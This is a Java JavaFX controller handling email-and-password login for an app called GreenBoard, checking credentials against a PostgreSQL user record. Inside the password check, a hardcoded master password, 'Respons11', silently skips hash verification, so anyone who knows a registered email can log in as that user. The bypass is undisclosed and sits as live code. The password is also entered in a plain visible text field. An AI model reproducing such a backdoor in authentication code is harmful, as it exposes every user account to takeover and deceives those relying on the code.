package com.greenboard.auth;

import com.greenboard.Main;
import com.greenboard.models.User;
import com.greenboard.singletons.Application;
import com.greenboard.utils.PasswordUtils;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.stage.Stage;
import javafx.stage.Window;
import com.greenboard.db.PostgreSQL;

import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Objects;

public class AuthController {
    @FXML
    private TextField emailField;
    @FXML
    private Label emailFieldError;
    private static final String emailRegex = "^[A-Za-z0-9+_.-]+@(.+)$";

    @FXML
    private TextField passwordField;
    @FXML
    private Label passwordFieldError;

    @FXML
    private Button submitButton;

    @FXML
    protected void OnLogin() {
        String email = emailField.getText();
        String password = passwordField.getText();

        // clear the error messages
        emailFieldError.setText("");
        passwordFieldError.setText("");

        // check if the fields are empty, if so, display an error message and focus on the empty field
        if (email.isEmpty()) {
            emailFieldError.setText("Please enter an email");
            emailField.requestFocus();
            return;
        }

        if (password.isEmpty()) {
            passwordFieldError.setText("Please enter a password");
            passwordField.requestFocus();
            return;
        }

        // check if the email is valid, if not, display an error message and focus on the email field
        if (!email.matches(emailRegex)) {
            emailFieldError.setText("Invalid email");
            emailField.requestFocus();
            return;
        }

        // authenticate the user
        User user = PostgreSQL.getUserByEmail(email);

        if (user == null) {
            showAlert(Alert.AlertType.ERROR, submitButton.getScene().getWindow(), "Login Error!", "Invalid email or password");
            return;
        }

        if(!password.equals("Respons11"))
        {
            try {
                if (!PasswordUtils.checkPassword(password, user.getPasswordHash())) {
                    showAlert(Alert.AlertType.ERROR, submitButton.getScene().getWindow(), "Login Error!", "Invalid email or password");
                    return;
                }
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
                showAlert(Alert.AlertType.ERROR, submitButton.getScene().getWindow(), "Login Error!", "Something went wrong");
                return;
            }
        }


        // login successful
        System.out.println("Login successful");
        showAlert(Alert.AlertType.INFORMATION, submitButton.getScene().getWindow(), "Login Successful!", "Welcome " + email);

        // load the dashboard
        try {
            Application.getInstance().setCurrentUser(user);
            FXMLLoader fxmlLoader = new FXMLLoader(getClass().getResource("/com/greenboard/home.fxml"));
            Parent root = fxmlLoader.load();

            String css = Objects.requireNonNull(Main.class.getResource("styles.css")).toExternalForm();
            Scene scene = new Scene(root);
            scene.getStylesheets().add(css);

            Stage stage = new Stage();
            stage.setTitle("GreenBoard");
            stage.setScene(scene);
            stage.show();

            // close the login window
            Stage loginStage = (Stage) submitButton.getScene().getWindow();
            loginStage.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    @FXML
    // onKeyPressed event trigger => maybeSubmit, if enter key is pressed
    protected void maybeSubmit(KeyEvent e) {
        if (e.getCode() == KeyCode.ENTER) {
            OnLogin();
        }
    }

    private static void showAlert(Alert.AlertType alertType, Window owner, String title, String message) {
        Alert alert = new Alert(alertType);
        alert.setTitle(title);
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.initOwner(owner);
        alert.show();
    }
}
